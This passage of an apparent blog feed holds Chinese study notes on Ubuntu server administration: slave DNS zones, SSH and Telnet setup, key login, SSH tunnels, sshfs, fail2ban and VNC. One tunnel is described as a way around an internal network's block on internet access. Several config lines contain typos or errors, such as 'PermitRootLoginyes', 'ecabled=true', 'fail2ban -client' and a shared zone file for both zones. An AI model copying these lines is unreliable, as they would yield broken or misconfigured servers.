class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/<span class="built_in">bind</span>/named.conf.options</span><br><span class="line"><span class="comment"># 内容</span></span><br><span class="line">acl <span class="string">"local"</span>&#123;   <span class="comment"># </span></span><br><span class="line">10.1.8.0/24；</span><br><span class="line">&#125;； </span><br><span class="line">options &#123;</span><br><span class="line">recursion yes;   </span><br><span class="line">allow-recursion &#123; <span class="built_in">local</span>; &#125;;  </span><br><span class="line">listen-on &#123; 10.0.8.20; &#125;;  <span class="comment"># 侦听自己的</span></span><br><span class="line">allow-transfer &#123; none; &#125;;</span><br><span class="line"></span><br><span class="line">forwarders &#123;</span><br><span class="line">9.9.9.9;  </span><br><span class="line">8.8.8.8;</span><br><span class="line">&#125;;</span><br><span class="line">............</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br></pre></td></tr></table></figure><p>5.slave dns服务器上创建区域</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/bind/named.conf.local</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正向zone区域（和master上的对应好）</span></span><br><span class="line">zone <span class="string">"lab.com"</span>&#123;</span><br><span class="line"><span class="built_in">type</span> slave;</span><br><span class="line">file <span class="string">"db.lab.com"</span>;  <span class="comment"># 不能使用绝对路径(区域文件不用手动创建)</span></span><br><span class="line">masters &#123; 10.1.8.10; &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 反向区域</span></span><br><span class="line">zone <span class="string">"8.1.10.in-addr.arpa"</span>&#123;</span><br><span class="line"><span class="built_in">type</span> slave;</span><br><span class="line">file <span class="string">"db.lab.com"</span>;  <span class="comment"># 不能使用绝对路径</span></span><br><span class="line">masters &#123; 10.1.8.10; &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#区域文件db.lab.com不用手动创建</span></span><br><span class="line"><span class="comment"># 会自动从master上同步下来</span></span><br><span class="line"><span class="comment"># 位置在 /var/cache/bind/   而且文件是加了密的</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看slave dns服务器的情况</span></span><br><span class="line">grep <span class="built_in">bind</span> /var/<span class="built_in">log</span>/syslog</span><br></pre></td></tr></table></figure><p><strong>记录更新通知</strong><br>Slave服务器到达更新周期<br>客户端数据加密保存（不能直接修改）<br>Master服务器通知版本号</p><p>master服务器的dns配置更新之后，一定要手动修改版本号，然后重启</p><p>在区域配置文件配置（master服务器的dns配置更新之后会通知slave服务器）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/bind/named.conf.local</span></span><br><span class="line"><span class="comment"># 正反向zone都要配置</span></span><br><span class="line">also-notify &#123; 10.1.8.20; &#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DNS服务&quot;&gt;&lt;a href=&quot;#DNS服务&quot; class=&quot;headerlink&quot; title=&quot;DNS服务&quot;&gt;&lt;/a&gt;DNS服务&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;您是谁家老小&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;域名解析原理&quot;&gt;&lt;a h
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.xpshuai.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://www.xpshuai.cn/tags/Linux/"/>
    
      <category term="ubuntu" scheme="http://www.xpshuai.cn/tags/ubuntu/"/>
    
      <category term="DNS" scheme="http://www.xpshuai.cn/tags/DNS/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu server-远程管理</title>
    <link href="http://www.xpshuai.cn/ubuntu%20server-%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86/"/>
    <id>http://www.xpshuai.cn/ubuntu server-远程管理/</id>
    <published>2020-03-31T05:31:13.000Z</published>
    <updated>2020-03-31T05:37:26.946Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第七章-远程管理"><a href="#第七章-远程管理" class="headerlink" title="第七章-远程管理"></a>第七章-远程管理</h1><blockquote><p>看我遥控你</p></blockquote><h2 id="远程访问方式"><a href="#远程访问方式" class="headerlink" title="远程访问方式"></a><font color="red">远程访问方式</font></h2><p><strong>为什么要远程管理？</strong><br>服务器大多部署与专门的机房：</p><ul><li>电磁、噪声、氧气、温度湿度等都不适宜人类长期居住</li><li>避免闲杂人等结束业务服务器</li></ul><p><strong>远程管理</strong></p><ul><li>不同的操作系统都支持远程管理技术</li><li>命令行远程管理工具</li><li>图形化远程管理工具</li></ul><h4 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h4><blockquote><p>账号证明就是你</p></blockquote><p>古老的命令行远程管理工具（保底的，建议能不用就不用）</p><ul><li>不安全（明文）</li><li>应尽量避免适用（适用于不支持ssh的环境）</li><li>客户端程序包含在所有系统的默认安装中</li><li>服务端口默认TCP 23</li></ul><p><strong>客户端</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#可以连接任何域名和端口</span></span><br><span class="line">telnet 1.1.1.1 80</span><br><span class="line"></span><br><span class="line"><span class="comment">#和80端口建立socket连接后，可以发送http数据</span></span><br></pre></td></tr></table></figure></p><p><strong>服务器端程序安装</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install telnetd</span><br><span class="line"></span><br><span class="line">vim /etc/issus.net <span class="comment"># 避免泄露版本信息,</span></span><br><span class="line"><span class="comment">#打开文件，修改tenlet的banner信息（可以修改为一些告知的警告信息:"本公司的服务器,出问题承担法律责任"哈哈）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看服务状态</span></span><br><span class="line">systemctl status inetd.service</span><br></pre></td></tr></table></figure></p><h4 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h4><blockquote><p>账号证明就是你</p></blockquote><p><strong>服务器安装</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ubuntu中ssh-server和ssh-client都默认安装了</span></span><br><span class="line">sudo apt install openssh-server  <span class="comment"># openssh是个工具套件(包含了sftp,scp等)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sftp(替代了sftp)  &lt;---&gt;  ftp(明文传输,不太安全)</span></span><br><span class="line"><span class="comment"># scp(替代了rcp)   &lt;---&gt;  rcp(远程拷贝文件,明文传输,不太安全)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看服务状态</span></span><br><span class="line">systemctl status sshd.service</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务端口默认`22`  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置文件(ubuntu上来就可以直接使用不用配置)</span></span><br><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line"><span class="comment">#修改配置在这个文件</span></span><br></pre></td></tr></table></figure></p><p>SSH1、SSH2两个版本(版本2更安全)</p><p><strong>配置文件</strong><br><code>vim /etc/ssh/sshd_config</code><br>常用配置项：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Banner /etc/ssh_banner.sh   <span class="comment"># 登录前的banner,指定文件</span></span><br><span class="line">Port  2222<span class="comment"># 修改默认端口(修改后，下次连接会改变端口)</span></span><br><span class="line">PubkeyAuthentication yes<span class="comment"># 开启后使用公钥登录/关闭(no)</span></span><br><span class="line">ListenAddress 12.34.56.78  <span class="comment"># 指定哪块网卡才能侦听22(被ssh连接)</span></span><br><span class="line">PermitRootLoginyes<span class="comment"># 是否允许root远程登录(不过还是建议使用普通账号),建议设置为no是禁止所有方式登录   #prohibit-password是禁用账号密码方式</span></span><br><span class="line">Protocol 2  <span class="comment"># 默认是2.0的协议，可以加一下这条配置，指定只接受2.0版本的连接</span></span><br><span class="line">Allowsers user1 user2<span class="comment"># DenyUsers user3    允许/禁止ssh连接的用户</span></span><br><span class="line">AllowGroup sshusers<span class="comment"># 允许/禁止ssh连接的用户`组`</span></span><br><span class="line">PasswordAuthentication no  <span class="comment"># 禁止使用密码登录(单一密码认证的安全性很低)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更多配置查文档</span></span><br></pre></td></tr></table></figure></p><p><strong>一些零散问题  — SSH工具</strong><br>1.scp<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#默认连接22端口，如果修改了就需要指定端口号</span></span><br><span class="line">scp a.txt 192.168.1.10:  <span class="comment"># 拷贝一个文件(默认本地账号与原创系统账号同名，默认目标是主目录)   注意冒号</span></span><br><span class="line">scp a.txt user1@192.168.1.10:/home/b.txt   <span class="comment"># 指定用户名、目标路径</span></span><br><span class="line"></span><br><span class="line">scp -rv <span class="built_in">dirs</span>/ user1@192.168.1.10:   <span class="comment"># 拷贝一个目录， -r递归,-v详细信息</span></span><br><span class="line"></span><br><span class="line">scp user1@192.168.1.10:/tmp/b.txt . <span class="comment"># 拷贝目标服务器的文件到我的机器当前目录上(下载)</span></span><br></pre></td></tr></table></figure></p><p>2.SFTP（ssh和ftp的组合）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 登录</span></span><br><span class="line">sftp xps@192.168.1.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载文件</span></span><br><span class="line">get a.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传</span></span><br><span class="line">put</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一些命令：help, ls, cd, get, wget, put, mput</span></span><br><span class="line"><span class="comment"># 退出 quit   exit</span></span><br></pre></td></tr></table></figure></p><p><strong>ssh公钥登录</strong><br>非对称算法（公钥算法）</p><ul><li>公钥</li><li>私钥<br>公钥加密，私钥解密；私钥加密，公钥解密</li></ul><p>生成秘钥对<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.在我的机器(客户端)产生一对， 选择rsa算法，秘钥长度选择4096</span></span><br><span class="line">ssh-keygen -t rsa -b 4096</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改...</span></span><br><span class="line"><span class="comment"># 命名秘钥对</span></span><br><span class="line">ssh-keygen -t rsa -b 4096 -f id_mail</span><br><span class="line"><span class="comment"># 修改私钥密码文(这个密码要设置更加安全一点) -p， -f指定修改哪个key的</span></span><br><span class="line">ssh-keygen -p -f ~/.ssh/id_rsa    <span class="comment"># 有多个的话，-f指定</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.设置公私钥保存的位置，和打开的密码</span></span><br><span class="line"><span class="comment"># 存放在下面两个文件</span></span><br><span class="line">~/.ssh/id_rsa  <span class="comment"># 私钥</span></span><br><span class="line">~/.ssh/id_rsa.pub  <span class="comment"># 公钥</span></span><br><span class="line"><span class="comment">#ps：know_hosts是连接过的主机</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.把公钥文件--&gt;传送到目标服务器上(服务器上会变成.ssh/authorized_key)</span></span><br><span class="line">ssh-copy-id  xps@192.168.0.10  <span class="comment">#如果有多个，-i选择公钥</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 建议设本地私钥文件权限</span></span><br><span class="line">chmod 400 .ssh/id_rsa</span><br><span class="line"><span class="comment"># 5.服务端公钥权限也要修改</span></span><br><span class="line">.ssh/authorized_key</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.现在可放心登录了(现在输入的密码是对私钥加密的密码)</span></span><br><span class="line">ssh xps@192.168.0.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># Note：记得配置文件修改为禁止使用ssh密码登录,使用公钥登录：</span></span><br><span class="line">PasswordAuthentication no</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line"><span class="comment"># <span class="doctag">Note:</span>私钥千万不能泄露哦</span></span><br></pre></td></tr></table></figure></p><h2 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a><font color="red">SSH隧道</font></h2><p>通过ssh隧道，封装一些其他的服务数据，保证安全性</p><p><strong>登录</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssh xps@192.168.0.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录之后，不进入shell界面（只是获得会话后运行一个命令，但效果是一样的） -- 命令服务端去ping另外一台机器</span></span><br><span class="line"><span class="comment"># -i指定私钥，-p指定端口</span></span><br><span class="line">ssh -i ~/.ssh/id_main ssh xps@192.168.0.10 -p 2222 ping 192.168.0.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># (cstream -t限制传输速度通信带宽)拷贝文件夹到目标机器（本地打包, 在服务端解包），pv显示带宽占用情况 </span></span><br><span class="line"><span class="comment"># --- 企业用的网络带宽(质量好)比家用的成本很贵</span></span><br><span class="line">tar -cj dir/ | pv |cstream -t 100k | ssh xps@192.168.0.10 <span class="string">'tar -xj'</span></span><br></pre></td></tr></table></figure></p><p><strong>ssh隧道 – 实现远程映射</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###### 端口映射（两个机器之间，添加一个加密的管道 来连接）</span></span><br><span class="line"><span class="comment"># 映射远程端口23到本机2001端口</span></span><br><span class="line"><span class="comment">#（-f端口转发,-N不占用命令行窗口, -L侦听本机的端口，localhost理解为隧道，23为目标机器端口，最后是目标机器ip）</span></span><br><span class="line">ssh -fN -L2001:localhost:23 xps@192.168.0.10 </span><br><span class="line"><span class="comment"># 现在，telnet本机的2001端口，就相当于通过机密的隧道来映射到目标的23端口</span></span><br><span class="line"><span class="comment"># 其他类型的服务也可以封装...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 拓展：远程映射</span></span><br><span class="line"><span class="comment"># 隧道的起点：我的机器，隧道的终点：'另外机器'。然后通过'另外机器',访问目标机器(sina)</span></span><br><span class="line"><span class="comment"># 本机的2002端口，通过ssh隧道，映射到'另外机器'(世界上随便一个机器)的ip的80端口，</span></span><br><span class="line"><span class="comment"># 用途：内网特殊的服务器运行访问外网(进行映射)，就能突破对内容不能上网的限制</span></span><br><span class="line"><span class="comment"># 限制：一对一，针对的外网的某一台（提高：一个端口访问外网所有资源，自己找资料）</span></span><br><span class="line">ssh -fN -L2002:123.206.96.26:80 xps@192.168.0.10  </span><br><span class="line"><span class="comment"># 再telnet 127.0.0.1:2002,就是达到了访问123.206.96.26的80端口的目的(最后的ip只是建立隧道,类似中间的一个)</span></span><br></pre></td></tr></table></figure></p><p><img src="/ubuntu server-远程管理/20200330152732562_32379.png" alt></p><p><img src="/ubuntu server-远程管理/20200330154229749_5054.png" alt></p><p><strong>ssh隧道 – 实现文件系统挂载</strong><br>比如，一开机，就自动把远程机器的目录/分区挂载到我本机上，跟访问本地目录一样的效果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## ssh隧道实现文件系统的挂载</span></span><br><span class="line"><span class="comment"># 第一个ip的要挂载的远程机器，后面的本机目录</span></span><br><span class="line">sshfs xps@192.168.0.10:home/<span class="built_in">test</span>  /mnt/myfiles<span class="comment"># 远程挂载远程机器目录到本地</span></span><br><span class="line"><span class="comment"># 再查看，会发现本地目录多了远程服务器目录的文件（如果网络带宽不够，性能和体验就比较差）</span></span><br><span class="line"><span class="comment"># 在客户端/服务端对文件进行操作，都是可以的</span></span><br><span class="line">umount /mnt/myfiles<span class="comment"># 卸载1</span></span><br><span class="line">fusermount -u /mnt/myfiles    <span class="comment"># 卸载2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置文件使用持久化挂载</span></span><br><span class="line">vim /etc/fstab</span><br><span class="line">user1@192.168.0.10:/path  /mntpotin   fuse,sshfs,rw,noauto,user,_netdev0</span><br><span class="line"><span class="comment"># 目标机器的路径，本机的挂载点</span></span><br></pre></td></tr></table></figure><p><strong>SSH客户端</strong><br>若要管理的服务器的数目众多，对每台服务器做一个方便记忆的<code>标签</code>，简化登录</p><p>在本机(客户端)创建一个客户端配置文件：<code>~/.ssh/config</code><br>内容<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">host server1  <span class="comment"># 别名随意</span></span><br><span class="line">Hostname 192.168.1.10  <span class="comment"># 对应主机ip，端口，用户名</span></span><br><span class="line">Port 22</span><br><span class="line">User xps</span><br><span class="line"></span><br><span class="line">host db2</span><br><span class="line">Hostname 192.168.1.10</span><br><span class="line">Port 22</span><br><span class="line">User xps</span><br><span class="line"></span><br><span class="line">host mail1</span><br><span class="line">Hostname 192.168.1.10</span><br><span class="line">Port 22</span><br><span class="line">User xps</span><br></pre></td></tr></table></figure></p><p>以后登录的话，直接：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接登录别名即可(不仅方便，还隐藏了ip，更加安全)</span></span><br><span class="line">ssh db1</span><br></pre></td></tr></table></figure></p><h2 id="SSH安全"><a href="#SSH安全" class="headerlink" title="SSH安全"></a><font color="red">SSH安全</font></h2><p><strong>SSH防爆破</strong><br>密码爆破防护</p><p>方法：监视：次数太多就禁止该ip访问</p><p>借助<code>fail2ban</code>来实现:<br>fail2ban原理：周期性的检查登录日志，对异常的ip进行屏蔽(调用防火墙实现)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">apt install fail2ban</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认主配置文件，软件更新时被覆盖(`所以一般不会使用它`)   jail --&gt; 监狱</span></span><br><span class="line">/etc/fail2ban/jail.conf</span><br><span class="line"><span class="comment"># 本地配置文件，软件更新不被覆盖，优先级更高（`一般常修改这个文件`） 复制一份：cp jail.conf jail.local</span></span><br><span class="line">/etc/fail2ban/jail.local</span><br><span class="line"><span class="comment">#配置项(一般只需配置几项)</span></span><br><span class="line"><span class="comment">#1.全局的：</span></span><br><span class="line">ignoreip=127.0.0.1/8 19.168.0.10  <span class="comment"># 忽略并不进行监视的地址（受信的ip地址段）</span></span><br><span class="line">bantime=-1   <span class="comment"># 禁用的时间(单位是s)， -1是永远屏蔽</span></span><br><span class="line">findtime=1   <span class="comment"># 查询间隔时间</span></span><br><span class="line">maxretry=5   <span class="comment"># 连着失败输入多少次密码，我就屏蔽你</span></span><br><span class="line"><span class="comment">#2.Actions: 有异常做什么动作(比如报警邮件，默认是防火墙屏蔽)</span></span><br><span class="line"><span class="comment">#3.Jails设置：针对不同类型的服务(并不仅限于ssh服务)，配置不同的（这里的优先级比全局配置项高）</span></span><br><span class="line">[sshd]</span><br><span class="line">ecabled=<span class="literal">true</span> <span class="comment"># 启用对ssh的jails</span></span><br><span class="line">filter=sshd  <span class="comment"># 查找的关键词</span></span><br><span class="line">logpath = xxxxxx.log</span><br><span class="line"><span class="comment"># 以ssh服务为例(见下图)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务生效 </span></span><br><span class="line">sudo systemctl restart fail2ban.service</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看身份认证日志文件</span></span><br><span class="line">tail -f /var/<span class="built_in">log</span>/auth.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看jail列表(都有哪些jail，jail的情况)</span></span><br><span class="line">sudo fail2ban -client status</span><br><span class="line">sudo fail2ban -client status sshd <span class="comment"># 查看ssh的jail的详细信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看防火墙规则</span></span><br><span class="line">sudo iptables -S</span><br><span class="line">sudo iptables -L -n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动解除被禁IP</span></span><br><span class="line">sudo iptables -D f2b-sshd<span class="_">-s</span> 192.168.1.111 -j REJECT   <span class="comment"># 通过删除防火墙某一个规则 -D,  REJECT或DROP看自己的情况</span></span><br><span class="line">sudo fail2ban-client <span class="built_in">set</span> sshd unbanip 192.168.1.8</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动解除禁用之后，但是如果重启服务，会再自动查看日志：还没有超过被禁期限的ip会再次被禁</span></span><br></pre></td></tr></table></figure></p><p><img src="/ubuntu server-远程管理/20200330164545399_6809.png" alt></p><h2 id="VNC服务"><a href="#VNC服务" class="headerlink" title="VNC服务"></a><font color="red">VNC服务</font></h2><blockquote><p>这里只介绍vnc，还有其他更优秀的工具，但是vnc的适用范围最广</p></blockquote><p>图形化界面（类似于windows下的远程桌面）</p><ul><li>使用图形化界面及工具</li><li>是Linux系统最通用的远程图形管理工具（通用适用于windows）</li></ul><p>安装图形环境<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这里安装简化版的xfce4桌面环境，这里选择vnc的一个软件包:tightvncserver. 也可以自己选择别的版本的</span></span><br><span class="line">sudo apt install gnome-core xfce4 xfce4-goodies tightvncserver</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一个vnc可以启动多个侦听端口(默认从5901开始)，从不同端口连接，打开不同会话(每个用户看到的桌面是不一样的)</span></span><br><span class="line"><span class="comment"># 若只侦听一个端口，通过一个端口连接，多个用户看到的都是一个桌面</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 建议：多用户，在每一个不同权限的用户下(su进去，运行启动实例)，这样不同用户连接就是不同的桌面了</span></span><br></pre></td></tr></table></figure></p><p>运行配置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">vncserver  <span class="comment"># 启动vnc服务（接下来会让你输入连接密码和只读密码）</span></span><br><span class="line">~/.vnc/xstartup   <span class="comment"># 会生成运行文件</span></span><br><span class="line">vncserver -<span class="built_in">kill</span>:1 <span class="comment"># 删掉自动生成的实例（因为不一定最适合我们的桌面环境。冒号后面是1是5901,如果是2就是5902）</span></span><br><span class="line"><span class="comment"># 备份一下文件</span></span><br><span class="line">mv xstartup xstartup.bak</span><br><span class="line"><span class="comment"># 创建新运行文件， 手动配置适合我们xfce4的vnc配置</span></span><br><span class="line">vim xstartup</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">xrdb <span class="variable">$HOME</span>/.Xresources</span><br><span class="line">startxfce4 &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改权限</span></span><br><span class="line">chmod +x ~/.vnc/xstartup</span><br><span class="line"><span class="comment"># 重新运行</span></span><br><span class="line">vncserver   <span class="comment"># tcp的5901端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 就可以在客户端用客户端软件连接了(比如：Remote Desktop Viewer) 输入ip:端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">Note:</span> 服务器上，能少开端口就少开端口，能少开服务就少开服务</span></span><br></pre></td></tr></table></figure></p><p>多用户<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 每个用户不用会话</span></span><br><span class="line"><span class="comment"># 在每一个不同权限的用户下(su进去，运行启动实例)，这样不同用户连接就是不同的桌面了</span></span><br><span class="line">su newuser1</span><br><span class="line">vncserver</span><br><span class="line">~/.vnc/xstartup  </span><br><span class="line">vncserver -<span class="built_in">kill</span>:2</span><br><span class="line">vim xstartup</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">xrdb <span class="variable">$HOME</span>/.Xresources</span><br><span class="line">startxfce4 &amp;</span><br><span class="line"></span><br><span class="line">chmod +x ~/.vnc/xstartup</span><br><span class="line">vncserver :2   <span class="comment"># tcp的5902端口</span></span><br></pre></td></tr></table></figure></p><blockquote><p>ps: vnc的加密强度不是很高，所以：在不需要vnc的时候，建议杀掉vnc进程(<code>vncserver -kill:2</code>)</p></blockquote><p>因为 